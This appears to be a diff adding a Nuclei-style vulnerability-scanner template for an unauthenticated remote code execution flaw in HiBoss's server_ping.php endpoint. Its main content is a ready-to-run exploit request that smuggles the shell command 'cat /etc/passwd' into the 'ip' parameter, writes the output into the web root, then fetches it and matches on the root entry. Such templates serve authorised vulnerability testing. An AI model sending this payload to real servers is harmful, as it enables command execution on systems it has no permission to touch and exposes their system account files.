@@ -1,0 +1,31 @@
+id: hiboss-rce
+
+info:
+  name: Hiboss RCE
+  author: pikpikcu
+  severity: critical
+  description: A vulnerability in HiBoss allows remote unauthenticated attackers to cause the server to execute arbitrary code via the 'server_ping.php' endpoint and the 'ip' parameter.
+  reference:
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%20%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20server_ping.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md?btwaf=40088994
+  tags: hiboss,rce
+
+requests:
+  - raw:
+      - |
+        GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{randstr}}.txt&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
